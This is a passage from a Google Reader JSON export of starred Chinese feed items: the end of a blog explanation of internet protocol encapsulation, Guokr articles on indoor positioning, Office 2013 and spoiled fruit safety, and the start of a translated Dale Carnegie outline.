TCP协议</strong></p>\n\n<p>TCP数据包需要设置端口，接收方（Google）的HTTP端口默认是80，发送方（本机）的端口是一个随机生成的1024-65535之间的整数，假定为51775。</p>\n\n<p>TCP数据包的标头长度为20字节，加上嵌入HTTP的数据包，总长度变为4980字节。</p>\n\n<p><strong>9.6 IP协议</strong></p>\n\n<p>然后，TCP数据包再嵌入IP数据包。IP数据包需要设置双方的IP地址，这是已知的，发送方是192.168.1.100（本机），接收方是172.194.72.105（Google）。</p>\n\n<p>IP数据包的标头长度为20字节，加上嵌入的TCP数据包，总长度变为5000字节。</p>\n\n<p><strong>9.7 以太网协议</strong></p>\n\n<p>最后，IP数据包嵌入以太网数据包。以太网数据包需要设置双方的MAC地址，发送方为本机的网卡MAC地址，接收方为网关192.168.1.1的MAC地址（通过ARP协议得到）。</p>\n\n<p>以太网数据包的数据部分，最大长度为1500字节，而现在的IP数据包长度为5000字节。因此，IP数据包必须分割成四个包。因为每个包都有自己的IP标头（20字节），所以四个包的IP数据包的长度分别为1500、1500、1500、560。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201206/bg2012061107.png\"></p>\n\n<p><strong>9.8 服务器端响应</strong></p>\n\n<p>经过多个网关的转发，Google的服务器172.194.72.105，收到了这四个以太网数据包。</p>\n\n<p>根据IP标头的序号，Google将四个包拼起来，取出完整的TCP数据包，然后读出里面的\"HTTP请求\"，接着做出\"HTTP响应\"，再用TCP协议发回来。</p>\n\n<p>本机收到HTTP响应以后，就可以将网页显示出来，完成一次网络通信。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201206/bg2012061104.jpg\"></p>\n\n<p>这个例子就到此为止，虽然经过了简化，但它大致上反映了互联网协议的整个通信过程。</p>\n\n<p>（完）</p><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;border:1px solid #d3d3d3;margin:1em;background-color:#aad2f0;border-radius:10px\"><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名 | <a href=\"http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh\">Creative Commons BY-NC-ND 3.0</a></li>\n<li>原文网址：<a href=\"http://www.ruanyifeng.com/blog/2012/06/internet_protocol_suite_part_ii.html\">http://www.ruanyifeng.com/blog/2012/06/internet_protocol_suite_part_ii.html</a></li>\n<li>最后修改时间：2012年7月26日 16:52</li>\n<li>付费支持：<a href=\"https://me.alipay.com/ruanyf\"><img src=\"http://www.ruanyifeng.com/blog/images/rmb_32.png\" title=\"人民币\" alt=\"人民币 - 支付宝\" style=\"border:none;vertical-align:middle\"></a> | <a href=\"https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&amp;business=yifeng.ruan@gmail.com&amp;currency_code=USD&amp;amount=0.99&amp;return=http://www.ruanyifeng.com/thank.html&amp;item_name=Ruan%20YiFeng&#39;s%20Blog&amp;undefined_quantity=1&amp;no_note=0\"><img src=\"http://www.ruanyifeng.com/blog/images/dollar_32.png\" alt=\"美元 - paypal\" title=\"美元\" style=\"border:none;vertical-align:middle\"></a> </li>\n</ul></div><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;margin:1em;border-radius:10px\"></div>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/ruanyifeng",
      "title" : "阮一峰的网络日志",
      "htmlUrl" : "http://www.ruanyifeng.com/blog/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1342924695257",
    "timestampUsec" : "1342924695257452",
    "id" : "tag:google.com,2005:reader/item/355a57ad8c1f2abc",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "IPS：超越GPS的导航系统",
    "published" : 1342924695,
    "updated" : 1342924695,
    "alternate" : [ {
      "href" : "http://www.guokr.com/article/278059/",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<div>\n<p>随着交通的高速发展，GPS全球定位系统也成为了人们居家旅行外出游玩的必备工具。但是GPS只能告诉我们户外的交通线路，而现在的巨型建筑又如此之多，在商场里逛个街都很有可能迷路，让广大路痴群众很是着急。科技以人为本，IPS（Indoor Position System）室内定位系统就这样应运而生了。</p>\n<div>\n<h1>为什么要研发IPS</h1>\n<p>从已经十分普及的便携式导航设备，到备受推崇的自动驾驶汽车，甚至是巡航导弹的制导，所有的这些应用技术的实现，都要感谢美国全球定位系统（GPS）以及它的俄罗斯伙伴，格洛纳斯全球卫星导航系统（GLONASS）。然而，她们都有美中不足的两个地方：1、不能在室内工作。2、它们只在二维世界里徘徊。</p>\n<p>时至今日，这些限制因素造成的不便越来越明显。毕竟，我们使用的是穿越了两万公里漫漫旅程的极其微弱的卫星信号，相对较强的移动电话信号在穿越混凝土和其他固体障碍物时都不甚给力，GPS卫星信号就更别提了：在地球上侦测GPS信号的难度基本与搜寻两万多公里之外25瓦灯泡发出的微弱亮光相同。</p>\n<p>在进行海拔变化的侦测时，情况会变得更加复杂。GPS和GLONASS都能够大体测量出海拔高度，但通常情况下测得的数据较为粗略并且精度有限（大概在10至25米的范围）。当然，尽管存在着种种缺憾，以GPS卫星为基础的导航系统也彻底改变了整个社会的各个方面：从黑客攻击、农业遥测、地图测绘到找女朋友。</p>\n<p>那么到底能不能研发出室内进行定位的导航系统呢？答案是肯定的。事实上，所谓的室内定位系统（Indoor Positioning System ，IPS）几乎已近实现了。</p>\n<img alt=\"http://img1.guokr.com/gkimage/0k/97/0k/0k970k.png\" src=\"http://img1.guokr.com/gkimage/0k/97/0k/0k970k.png\">\n<p>去年，谷歌地图在安卓系统上推出了楼层平面图应用。服务地点包括购物商场、机场和一些大型的商业区。与此同时，诺基亚也在研发类似的室内定位系统，但与普通的2D平面图不同，该系统使用的是逼真的3D模型。Broadcom公司已经发布了一款支持IPS的芯片（BCM4752 ），并且不久装有此芯片的智能手机就会在市场上推出。</p>\n<p>与GPS和GLONASS不同的是，IPS并没有一套标准的运作方法。谷歌的办法是通过WiFi信号追踪设备位置——通过识别建筑物中设置的WiFi信号热点，对不同信号源的强度进行三角测量，粗略地得出你的大概位置；诺基亚的方案与此类似，但是运用的媒介是蓝牙信号而不是WiFi信号，因而能够得到更精确的结果（但是这意味着需要部署许多的蓝牙信号源）；其它的构想包括红外线传输甚至声源分析。值得注意的是：单独使用上述方案中的任何一种都无法达到较高的精确度和可靠性。在一个充满着各种各样乱七八糟物品、结构复杂的空间里，这些类型单一的信号会显得非常简陋和嘈杂了，更何况还有移动物体带来的信号干扰。</p>\n<div><img src=\"http://img1.guokr.com/gkimage/rk/sq/n0/rksqn0.png\" alt=\"Broadcom推出的IPS芯片\"><p>Broadcom推出的IPS芯片</p></div>\n<p>Broadcom 公司推出的芯片支持各种各样形式的IPS方案：WiFi，蓝牙，甚至是NFC（近场通讯技术）。更重要的是，该芯片还内置了各种各样的传感器，比如陀螺仪、磁力计、加速计甚至是测高计。就像备受欢迎的步数计一样，Broadcom公司的芯片几乎能够感知你的所有运动过程，而且无需通过无线信号网络进行三角测量。它只需测定你进入建筑物的地点（通过GPS），然后计算你的步数（通过加速计）、方向（通过陀螺仪）和高度（通过高度计）。</p>\n<p>有了这种可靠的解决方案，室内定位系统将会马上进入人们的生活中，未来的一至两年内一些客流量庞大的区域会率先开始试点工作，之后随着智能手机的高度普及，IPS系统也会像GPS一样逐渐达到全球范围内的完全覆盖。</p>\n</div>\n<div>\n<h1>IPS普及后的生活</h1>\n<div><img src=\"http://img1.guokr.com/gkimage/xe/48/qc/xe48qc.png\" alt=\"IPS系统的基本运作方式\"><p>IPS系统的基本运作方式</p></div>\n<p>当IPS全面覆盖之后，无论在世界的哪个角落，室内、室外或是底下，你的行踪都会被实时追踪，这意味着什么呢？\n在人们开始着手建设IPS之前，很有必要指出的是：就像GPS 一样，IPS不会向第三方泄露你的个人信息。IPS是仅针对用户的个人智能手机（或其他任何定位导航设备）运作的。和GPS相同，IPS的定位是完全被动的。即使政府通过IPS对我们进行监控，我们也有充足的预警时间。</p>\n<p>通过进一步的发展，IPS可催生出一系列附加程序。如果你喜欢那种脚蹬Nike跑鞋手拿GPS来计算跑步速度和里程的生活方式，那么IPS式的生活会带给你更多舒适。IPS能够精准的测出你跑了多少步，爬了几节楼梯，一丝不苟的进行计算，得出消耗了多少卡路里；IPS会对你在健身馆的表现做出完美的记录统计，细致到每一台健身器具；IPS还能够告诉你，每天你睡了多久，花在通勤、办公室和厕所的时间各是多少。</p>\n<p>然而，IPS的真正威力在于能将现实生活中的各种数据结合在一起。IPS不仅可以记录你最常使用Facebook或Twitter的场合，还可以被用来绘制你的消费频率分布图，甚至可以全程回放你的行程记录，并在谷歌地图上绘出详尽的路线。</p>\n<div><img src=\"http://img1.guokr.com/gkimage/is/yr/sl/isyrsl.png\" alt=\"IPS系统的紧急呼叫\"><p>IPS系统的紧急呼叫</p></div>\n<p>到那时，商家甚至能够通过RSS订阅告诉你此刻正热卖的特价商品，你的手机也能告诉你：嗨，伙计，我知道你在去星巴克的路上，但为什么不去试试旁边的那家更便宜的咖啡馆呢？这些服务同样不会监控任何个人信息。当然，你也可以选择开通特别的服务，实时向外发送你的行踪。</p>\n<p>IPS可以在博物馆中取代导览图，用手中手机的提示告诉游客详细的游览信息。IPS还会给父母们带来更强悍的技能：全程掌握孩子的行踪，当孩子偷逛限制级音像店时就可以实时发现并做处理。更具长远意义的是，IPS最终可以促成生活社交网络的形成：将来Facebook上的应用可以告诉你，哪个地方有谁想玩壁球或看电影。漫步街上时，你的手机会告诉你一个街区外有一个孩子正在兴致勃勃地看着你少时喜欢的漫画，你可以与他一同分享着那旧时的温馨回忆。当然，IPS也能告诉你在前面的夜总会中有多少寂寞青年期待解救。</p>\n<p>这种生活社交网络或许会不可避免地需要公开大量的个人数据，但一定会带来革命性的进步：到了那时，人们可以把更多的注意力投向身边美好的人和事，而不是像今天这样，不停地低头凝视手机，表情充满了哀怨。</p>\n<div>\n<div><br></div>\n</div>\n<hr>\n<div>\n<div><br></div>\n</div>\n<div>\n<div>文章编译自ExtremeTech： <strong>Think GPS is cool? IPS will blow your mind</strong></div>\n<div>作者：  Sebastian Anthony</div>\n</div>\n<div>\n<div>关于IPS技术的应用及发展，大家还可以戳环球科技观光团的文章： <a href=\"http://www.guokr.com/article/274512/\">怎么在商场里找厕所？是时候有个App了！</a></div>\n</div>\n<div>\n<div>以及创意科技小组的帖子： <a href=\"http://www.guokr.com/post/278141/\">路痴福音：室内导航系统（IPS）的新进展</a></div>\n</div>\n</div>\n</div>"
    },
    "author" : "Drink-Me",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.guokr.com/rss/",
      "title" : "果壳网 guokr.com",
      "htmlUrl" : "http://www.guokr.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1342924694977",
    "timestampUsec" : "1342924694977927",
    "id" : "tag:google.com,2005:reader/item/beed26729355d2fd",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "Office 2013：向云端进发",
    "published" : 1342924694,
    "updated" : 1342924694,
    "alternate" : [ {
      "href" : "http://www.guokr.com/article/281744/",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<div>\n<p>在云办公服务领域，谷歌已经将Google Docs与Google Drive完美整合，苹果也拥有iCloud和iWork服务，唯独微软在这方面还迟迟没有作为。北京时间本周二凌晨，微软发布了麾下明星产品Office套件的最新版本——Office 2013和Office 365。新版Office终于引入了云端技术，而且还为平板电脑操作进行了优化，为即将到来的Windows 8做好了铺垫。</p>\n<p>Office套件在2011年度为微软贡献了222亿美元的利润，超越了Windows系统，成为微软所有产品中最大的利润来源。随着办公软件市场的竞争日趋激烈，越来越多的同类产品正在通过价格优势蚕食Office的市场份额。如今办公软件向云端发展的趋势也越来越明显，微软的统治地位正在遭受前所未有的挑战。在这种情形下，最新发布的两款Office可以说是给微软支持者们注入了一剂强心针。</p>\n<div>\n<h1>Office 2013与Office 365</h1>\n<p>Office365是Office套件的网络版，与当前的Office 365不同，新版Office 365云计算办公套件可以让用户同时订购Office 2013桌面应用，面向一般消费者的Office 365家庭高级版就允许用户将Office 2013客户端下载到五台电脑内，而一次买断的用户只能把软件安装到一台电脑上。除了一次买断式付费，微软还为新版Office 365提供了按月订阅的付费方式。值得一提的是，Office套件还将为订阅用户实行免费升级。</p>\n<p>“新的Office将不再依托于某台电脑，它现在是跟着客户走。”Office设计总经理克里斯·普莱特利（Chris Pratley）在接受Wired网站采访时说，“用户只要登陆Windows Live账号，他的文件就将‘如影随形’。无论用户用的是手机还是电脑，或是其他电子设备，只要有网络连接，文件的同步就不会受到影响。”</p>\n<p>打开Office 2013，你可以发现在主页的右上角多出了一个登陆界面。登陆之后，软件会将使用过的文件同步到SkyDrive服务器上，用户便可以进行跨终端跨平台同步办公。</p>\n<div><img src=\"http://img1.guokr.com/gkimage/jj/zr/as/jjzras.png\" alt=\"在新版Word中，你可以通过右上角的登陆按钮登陆微软账户，同步各类文件\"><p>在新版Word中，你可以通过右上角的登陆按钮登陆微软账户，同步各类文件</p></div>\n<p>在手机与平板电脑地位越来越重要的今天，微软的云同步办公理念十分与时俱进。未来，Office文件将在云存储的帮助下轻易地流转于不同的设备之中，省去了线下数据传输的烦恼。微软还强调了Office 365云服务对Windows Phone手机的兼容，可见他们还想借此提高市场对Windows Phone手机的接纳程度。</p>\n<p>关于Office 2013和Office 365的售价，微软至今还未透露具体数据。但是Google Drive和iCloud已经创造了“免费午餐”的先例，如果微软想在这个市场上站稳脚跟，想必要在价格上给予消费者足够的优惠。</p>\n</div>\n<div>\n<h1>Metro化的新外观</h1>\n<div><img src=\"http://img1.guokr.com/gkimage/wd/1q/v2/wd1qv2.png\" alt=\"新的Office套件都采用了简洁的Metro界面\"><p>新的Office套件都采用了简洁的Metro界面</p></div>\n<p>新版Word、Excel、PowerPoint和Outlook都以Metro风格重新设计了外观。虽然有了Metro化的新外观，但他们依然运行在传统Windows桌面上（在平板电脑上也一样）。Windows 8的Metro启动屏幕上可以显示出Word、Excel、PowerPoint和Outlook的图标，不过系统会在用户点击之后自动切换到传统桌面上。</p>\n<p>系统切换听起来有些让人心烦，不过Office的新界面确实是有了很明显的提升。之前的Word在页面布局上略显凌乱，新版Word变得更加简洁也更加清新。为了更符合Metro页面的整体风格，Office套件都移除了底部的任务窗口。普莱特利对此的解释是：“我们把设计理念和Metro风格牢牢地捆绑在一起，力图打造出一个最简洁、最适合触屏操控的Office界面。所以我们移除了传统Window页面中常见的底端任务窗口。”</p>\n<p>Office 2013还提供了一个小工具，名叫“Touch Mode（触摸模式）”。当工具激活后，Office上的所有菜单条和工具条都会变大一些，方便用户进行触摸操纵。大小的改变不是很夸张，不会将某些内容推到屏幕外，也不会明显减少文档区域的面积，但大大方便了用户精确点击目标。</p>\n</div>\n<div>\n<h1>第三方应用</h1>\n<div><img src=\"http://img1.guokr.com/gkimage/dz/qv/v7/dzqvv7.png\" alt=\"在Outlook中使用必应地图标注地点\"><p>在Outlook中使用必应地图标注地点</p></div>\n<p>新Office将全面支持第三方应用，与它一同开始支持第三方应用的还有微软旗下的企业信息共享平台SharePoint。与Windows 8内的其他第三方应用一样，用户需要在应用商店里购买下载后才能够使用。</p>\n<p>通过第三方应用，Office的能力将得到扩展和加强。“我们正在寻求与第三方的合作，只要能让Office变得更加强大，你就是我们的合作对象。”普莱特利说。现在用户已经能够在Outlook内使用必应地图在邮件内标注具体地址，也可以在邮件中使用第三方软件显示电脑的任务项。</p>\n</div>\n<div>\n<h1>整合社交功能</h1>\n<div><img src=\"http://img1.guokr.com/gkimage/t6/ji/rw/t6jirw.png\" alt=\"新的分享界面\"><p>新的分享界面</p></div>\n<p>在社交网络成为许多人的必需品的今天，Office也将成为整个社交网络中的一部分。新Office套件中植入了社交功能，用户可以很方便地将文件上传到社交网站，分享和合作办公变得触手可及。比如你正在使用Excel制表，就可以点击“分享”键将图表中的任何内容分享给好友或同事。Linkedln、Facebook或是Twitter，通通没有问题。就算对方没有使用Office，他依然会接收到一个链接地址，打开链接便可以下载被分享的文件，微软在这方面展现出了相当的包容性。</p>\n</div>\n<div>\n<h1>Word</h1>\n<div><img src=\"http://img1.guokr.com/gkimage/jg/5e/0e/jg5e0e.png\" alt=\"新版Word中将支持直接播放网络视频\"><p>新版Word中将支持直接播放网络视频</p></div>\n<p>Word 2013内新添了一项“全屏阅读”功能，并且开始支持手势缩放以满足平板电脑用户的需求。新版Word还支持在文件中直接插入网络上的图片和视频，比如Flickr和Facebook上的照片或是Youtube上的短片。当含有网络信息的文件被分享时，接受方可以直接在Word内浏览那些来自于网络的图片和视频。</p>\n<p>此外，Word还针对新Office的分享支持添加了“查看评论”功能。被分享文件的右侧将出现一个小图标，用户可以点击它展开评论内容，还可以在该窗口内对评论进行回应。值得一提的是，新版Word开始支持直接打开PDF文件，并且可以随心所欲地进行编辑和保存。</p>\n</div>\n<div>\n<h1>Excel</h1>\n<div><img src=\"http://img1.guokr.com/gkimage/io/nn/2n/ionn2n.png\" alt=\"新版Excel制作的表单将更加美观\"><p>新版Excel制作的表单将更加美观</p></div>\n<p>Excel内新增了自动识别功能，能够在一定程度上探测到用户正在进行的制表工作内容，自动给出完善的辅助。假设你有许多英文名字需要按照姓、名和首字母缩写制成三列Excel表格。只要完成了姓、名两列，再输入首字母缩写列中的前几项，Excel便可以识别到这是一项怎样的工作，并自动帮你完成余下的内容。</p>\n<p>新版Excel还提供了快速数据分析工具。该工具将在用户输入数据后提供一些建议，来更好地分析、梳理格式和呈现数据。这项功能不仅为不熟悉Excel的用户提供了入门辅助，那些资深的Excel用户也能从中获得不少便利。同时，Excel内还植入了包括家庭开销表、存货表等许多常用的表单。结合快速数据分析工具，用户可以十分便捷地将一堆数字变为一张简洁美观、数据清晰的报告文件。</p>\n</div>\n<div>\n<h1>PowerPoint</h1>\n<p>PowerPoint现在采用了大量可视化的设计，Eyedropper可以让用户更直观地选择想使用的颜色，还有很多类似的改动。最令人称赞的当属Presenter View功能了，当用户将电脑连接上投影仪时，Presenter View可以让投影仪播放幻灯片，而电脑上显示的却是用户对该幻灯片的备注信息，毫无疑问，这会让报告人大大减轻背稿的压力。</p>\n</div>\n<div>\n<h1>市场反应</h1>\n<p>Office 2013和Office 365的各个方面都令人欣喜，页面更加美观，功能更加强大，目前微软已经开放了客户预览版的下载，大家可以点击 <a href=\"http://www.microsoft.com/china/office/preview\">这里</a> 抢先体验一下新版Office。有着Office套件长久以来积累的用户基数和针对Windows 8进行的触控改进，相信微软会凭借新版Office成为该领域的领头羊。当然，市场竞争的激烈程度不会因为任何一方的出色表现而降低，微软也必须在软件正式推出时好好把握定价这个关键因素。Office 2013究竟能交出一张怎样的成绩单，还得等待时间给我们答案。</p>\n<div>\n<div><br></div>\n</div>\n<hr>\n<div>\n<div><br></div>\n</div>\n<div>\n<div>文章编译自Wired： <strong>Hands-On: Microsoft Office Finally Gets Serious About the Cloud</strong></div>\n<div>作者：  Sebastian Anthony</div>\n</div>\n</div>\n</div>"
    },
    "author" : "果壳包果核",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.guokr.com/rss/",
      "title" : "果壳网 guokr.com",
      "htmlUrl" : "http://www.guokr.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1342700579196",
    "timestampUsec" : "1342700579196138",
    "id" : "tag:google.com,2005:reader/item/ce96dffc3f44dd7c",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "坏水果还能吃吗？",
    "published" : 1342700579,
    "updated" : 1342700579,
    "alternate" : [ {
      "href" : "http://www.guokr.com/article/280357/",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<div>\n<p><strong>流言：</strong> 【提醒！苹果烂一点就不能吃了哦】有人吃水果时，碰到水果烂了一部分，就把烂掉的部分剜掉再吃，以为这样就健康了。实际上，即使把水果烂掉的部分削去，剩余的部分也已通过果汁传入了细菌的代谢物,甚至还有微生物开始繁殖，其中的霉菌可导致人体细胞突变而致癌。因此，苹果烂一点就不能吃了哦！</p>\n<p><strong>真相：</strong> 不单单是苹果，水果都是些娇气的东西，怕摔怕碰，怕冷怕热。所以，我们经常会碰到一些烂果子。基于“勤俭节约”是国人崇尚的一种美德，于是，那些摔坏的苹果被老妈紧急做成的果盘，出现褐色斑块的鸭梨变成了梨汤，还得从长出青霉的橘子中抢出两瓣来吃。这些抢救性吃法究竟对不对？我们还得从烂果子的来源说起。</p>\n<p>一般来说，产生烂果子的原因可以分成三类，一是由于磕磕碰碰引起的机械性损伤，二是由于低温引起的冻伤，三是由于微生物侵染引起的霉变腐烂。</p>\n<div>\n<h1>碰伤的苹果还是好苹果</h1>\n<p>这三类损伤中，机械性损伤是最常见的。比如，车筐里装一袋子又红又大的苹果，然后经过了一段正在挖沟的小路；又或者一个品相完好的苹果，在洗干净甩水的时候飞向了地板。结果，就是你只能直面一堆“鼻青脸肿”的大苹果了。还好，这样的碰撞并不会引起什么。</p>\n<p>那些变软的部位，只是因为碰撞，细胞发生了破损，细胞质溢出。同时，由于细胞损伤，一些无色的多酚类物质被转化为深色的醌类物质，使得伤口呈现出特别颜色（其实，切开的苹果不立即吃完，也会变成褐色）。不管怎么说，纯属碰伤的烂苹果只会给人带来感官上的不悦。只要在碰撞后短时间内吃完（别让细菌在上面安居乐业），这类“坏果子”并不会影响我们的健康。</p>\n</div>\n<div>\n<h1>冻伤的香蕉也是好香蕉</h1>\n<p>夏天时，我们通常会把水果送入冰箱。但是，在冰箱里面放了一晚的香蕉，变成了烧火棍的模样。如果，时间再长一点，整个香蕉都会变成酱了。于是，“扔还是不扔”又成了难题。\n实际上，香蕉就是因为温度过低而“患病”的。</p>\n<p>在低温条件下，香蕉中的超氧化物歧化酶（SOD）的活性会急剧降低，不能及时清除细胞内自由基。越积越多的自由基会改变细胞膜的通透性，破坏细胞结构。另一方面，低温还能提高果胶酯酶的活性，这种酶会分解不溶性的果胶，从而使香蕉组织变软。</p>\n<p>放在冰箱里的香蕉果皮还会变黑，这是因为果皮中的聚苯氧化酶（PPO）把香蕉皮中天然存在的酚类聚合为多酚，这种多酚是一种与人体皮肤中黑色素类似的物质。此外，香蕉果皮的细胞膜破损之后，会释放出多巴胺，在氧化酶的作用下这种物质会与空气中的氧发生反应，生成棕色物质。这样一来，香蕉就变得又黑又软，不堪食用了。\n放在冰箱里的黄瓜表面也容易出现一些水渍斑，那也是由于低温影响了细胞膜作为“城墙”的功能，最终引起细胞坏死。</p>\n<p>虽然成因不同，但是冻伤香蕉和碰伤苹果的结局是相似的——都是细胞的破损。如果没有细菌抢着去抢占这些破损细胞的营养，这类坏果子也是相对安全的，虽然味道和口感会差一点。不过，由于细胞的破损，氨基酸、糖和无机盐等从细胞中流出来，给致病微生物、特别是真菌的生长提供了良好条件，一旦被霉菌侵占，问题就不同了。</p>\n</div>\n<div>\n<h1>霉变的水果，还是送进垃圾桶</h1>\n<p>与碰伤、冻伤不同的是，霉变的水果，垃圾桶才是他们最好的归宿。</p>\n<p>在水果上出现频率最高的就是以扩展青霉为代表的青霉，它们产生的展青霉素会产生引起动物的胃肠道功能紊乱，肾脏水肿等病症，并且因为展青霉素与细胞膜的结合过程是不可逆的，也就是说他们会赖在细胞上不走，会对细胞造成长期的损伤，甚至有致癌的可能。小鼠经口服用的半数致死剂量为，雄性每公斤体重46.3毫克，雌性每公斤体重29-48毫克。</p>\n<p>特别需要注意的是，把霉变部位去除再食用也未必安全，因为霉菌产生的展青霉素可以扩散到果实的其他部位。中国预防医学科学院的一项调查就发现，霉变苹果上外观正常部位的展青霉素含量为霉变部位的10-50%。正常部位的苹果的展青霉素含量可能高达3毫克每公斤。这样看来，还是把已经霉变的水果都送进垃圾桶更保险。</p>\n</div>\n<div>\n<h1>酒味果子，区别对待</h1>\n<p>除了上面提到的这些外观有明显变化的烂果子，我们还经常碰到一些变味的水果。比如，放久的苹果散发出了酒味，还能不能吃？如果在外观上没有明显的异常，口感上还可以接受，本着节约的原则，还是可以吃的。因为，水果（特别是苹果）在长期储存过程中，可能因为缺氧，转而进行无氧呼吸，将苹果内部的糖类物质转化为酒精。于是，我们就闻到酒味了。</p>\n<p>这里还要同那些已经变软变黑发出酒味的苹果区别一下。因为，这种发酵的苹果上很可能存在其他有害的杂菌，这样的果子最好参按照霉变果子处理。</p>\n<p><strong>结论：</strong> 不同的烂果子要区别对待。那些因为碰撞和冷冻造成的烂果子，还是可以吃的。至于那些因为霉菌感染变质的果子，还是尽快送入垃圾箱吧。</p>\n<div>\n<div><br></div>\n</div>\n<p>参考资料：</p>\n<table>\n<colgroup><col><col></colgroup>\n<tbody valign=\"top\">\n<tr><td>[1]</td><td>刘勇等。1991。我国部分地区霉烂苹果及部分水果制品中展青霉素的测定。卫生研究。20（4）：35-37。</td></tr>\n</tbody>\n</table>\n<table>\n<colgroup><col><col></colgroup>\n<tbody valign=\"top\">\n<tr><td>[2]</td><td>蒋跃明等。1991。香蕉低温酶促褐变。植物生理学报，17（2）：157-163。</td></tr>\n</tbody>\n</table>\n<table>\n<colgroup><col><col></colgroup>\n<tbody valign=\"top\">\n<tr><td>[3]</td><td>青霉及其毒素。http://course.cau-edu.net.cn/course/Z0173/ch08/se02/slide/slide01.html</td></tr>\n</tbody>\n</table>\n</div>\n</div>"
    },
    "author" : "史军",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.guokr.com/rss/",
      "title" : "果壳网 guokr.com",
      "htmlUrl" : "http://www.guokr.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1342538953010",
    "timestampUsec" : "1342538953010069",
    "id" : "tag:google.com,2005:reader/item/013e0979ab457c2e",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Books" ],
    "title" : "卡耐基人际关系指南",
    "published" : 1340250972,
    "updated" : 1340250972,
    "alternate" : [ {
      "href" : "http://www.ruanyifeng.com/blog/2012/06/how_to_win_friends_and_influence_people.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p><a href=\"http://zh.wikipedia.org/wiki/%E6%88%B4%E5%B0%94%C2%B7%E5%8D%A1%E8%80%90%E5%9F%BA\">卡耐基</a>（Dale Carnegie，1888－1955）是美国畅销书作家，主要研究人际关系和自我修养。</p><p><img src=\"http://image.beekka.com/blog/201206/bg2012062101.jpg\"></p>\n\n<p>他的成名作是1936年出版的<a href=\"http://en.wikipedia.org/wiki/How_to_Win_Friends_and_Influence_People\">《如何赢得朋友和获得影响力》</a>（How to Win Friends and Influence People），该书大获成功，英文版销量就超过1500万本，全球销量据说与《圣经》一个级别。（不知为何，中文版译名为《人性的弱点》，中学时我还以为是心理学著作。）</p>\n\n<p><img src=\"http://image.beekka.com/blog/201206/bg2012062102.jpg\"></p>\n\n<p>通常，我不看这类\"人生指南\"的书，因为感觉它们在推销一种陈腐的价值观，而且我也不太相信，它们真的能有多少作用。</p>\n\n<p>但是，我偶然读到了这本书的<a href=\"http://www.westegg.com/unmaintained/carnegie/win-friends.html\">大纲</a>，大吃一惊，发现自己完全错了，它真的是一本很好的\"人际关系实战指南\"。这些年来，自己的一些模模糊糊的想法，在书中得到了系统的清晰表达。如何处理人际关系，如何得到一种较理想的人生，它给出了非常好的建议。</p>\n\n<p>下面是我翻译的该书大纲，建议大家都来看看。</p>\n\n<p>================================================</p>\n\n<p><strong>如何赢得朋友和获得影响力</strong></p>\n\n<p>作者：[美] 戴尔·卡耐基</p>\n\n<p>译者：阮一峰</p>\n\n<p><img src=\"http://image.beekka.com/blog/201206/bg2012062103.jpg\"></p>\n\n<p><strong>一、人际关系的基本技巧</strong></p>\n\n<p>1. 不要批评、谴责、抱怨。<br>\n　 Don't criticize, condemn or complain.</p>\n\n<p>2. 真诚地欣赏他人。<br>\n　 Give honest and sincere appreciation.</p>\n\n<p>3. 激发他人的渴望。<br>\n　 Arouse in the other person an eager want.</p>\n\n<p><strong>二、获得他人好感的六种方法</strong></p>\n\n<p>4. 对他人真的感兴趣。<br>\n　 Become genuinely interested in other people.</p>\n\n<p>5. 微笑。<br>\n　 Smile.</p>\n\n<p>6. 所有语言中最甜蜜、最重要的声音，就是当一个人听到自己的名字。<br>\n　 Remember that a person's name is to that person the sweetest and most important sound in any language.</p>\n\n<p>7. 做一个优秀的听众，鼓励对方谈论他自己。<br>\n　 Be a good listener. Encourage others to talk about themselves.</p>\n\n<p>8. 谈对方感兴趣的话题。<br>\n　 Talk in terms of the other person's interests.</p>\n\n<p>9. 让对方感觉自己很重要，并且你是真诚地这样做。<br>\n　 Make the other person feel important - and do it sincerely.</p>\n\n<p><strong>三、如何得到他人的支持</strong></p>\n\n<p>10. 彻底赢得争议的唯一方法，就是避免争议。<br>\n　　The only way to get the best of an argument is to avoid it.</p>\n\n<p>11. 尊重他人的意见，绝不说\"你错了\"。<br>\n　　Show respect for the other person's opinions. Never say, \"You're wrong.\"</p>\n\n<p>12. 一旦发现自己不对，立刻无保留地承认。<br>\n　　If you are wrong, admit it quickly and emphatically.</p>\n\n<p>13. 以一种友好的方式开场。<br>\n　　Begin in a friendly way.</p>\n\n<p>14. 尽快让对方说\"是这样的\"。<br>\n　　Get the other person saying \"yes, yes\" immediately.</p>\n\n<p>15. 让他人多多发言。<br>\n　　Let the other person do a great deal of the talking.</p>\n\n<p>16. 让他人感觉，你说的是他的想法。<br>\n　　Let the other person feel that the idea is his or hers.</p>\n\n<p>17. 